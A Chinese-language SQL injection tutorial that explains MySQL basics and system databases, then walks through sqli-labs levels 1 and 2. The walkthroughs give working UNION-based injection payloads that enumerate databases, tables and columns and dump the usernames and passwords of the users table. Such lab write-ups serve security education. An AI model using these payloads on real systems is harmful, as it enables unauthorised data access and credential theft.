    1.什么是SQL注入

    SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息

    2.数据库基础语法

    查询当前数据库服务器所有的数据库

    show databases;

    选中某个数据库:use 数据库名
    查询当前数据库所有的表

     show tables；

    查询t1表所有数据

    select * from t1;

    union 合并查询2个特性：

    • 前面查询的语句 和 后面的查询语句 结果互不干扰！
    • 前面的查询语句的字段数量 和 后面的查询语句字段数量 要一致

    3.MYSQL系统库

    MySQL5.0版本后会有4个自带的数据库

    3.1information_schema 库(重点)

    information_schema 库是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；
    例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。
    主要掌握其中三个表就行了:
    SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。

    TABLES表：提供了关于数据中表的信息。table_schema字段记录了数据库名，table_name记录了表名。

    COLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name记录了表的字段名。

    3.2performance_schema库

    performance_schema库具有87张表。 MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。

    3.3mysql库

    mysql库是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。 常用举例：在mysql.user表中修改root用户的密码

    3.4sys库

    sys库具有1个表，100个视图。 sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。 可以查询谁使用了最多的资源，哪张表访问最多等

    4.sqli-labs第一关

    1. 输入?id=1 and 1=1 与?id=1 and 1=2。发现没有反应，可以看到1的前面和2的后面有一个单引号，所以这是一个字符型注入且闭合符为单引号
    2. 在id=1后面加上’进行闭合并且在sql语句的最后面加上–+将后面的limit0,1进行注释
    3. 使用order by来却的表的列数，在order by 4 是发生报错，所以列数为3
    4. 使用union联合查询。将id=-1，这样就可以将前面的select语句查询到都结果设置为空，从而使网页显示后面select语句查询到的结果
    5. ?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+查看所有数据库。concat是将多列当作一列输出，group_concat是将多行多列当作一行一列输出
    6. ?id=-1’ union select 1,database(),3 –+查看当前数据库
    7. ?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+查看security里的所有表
    8. ?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’–+查看users表里所有字段
    9. ?id=-1’ union select 1,group_concat(id,’‘,username,’‘,password),3 from security.users–+获取users表所有内容

    5.sqli-labs第二关

    1. ?id=1 and 1=1–+显示信息?id=1 and 1=2–+报错，说明网页执行了and 1=2，所以该关没有闭合符，是一个数字型注入
    2. order by 确定列数
    3. ?id=-1 union select 1,database(),3–+确定当前数据库
    4. ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+查看security里的所有表
    5. ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’–+查看users表里所有字段
    6. ?id=-1 union select 1,group_concat(id,’‘,username,’‘,password),3 from security.users–+获取users表所有内容
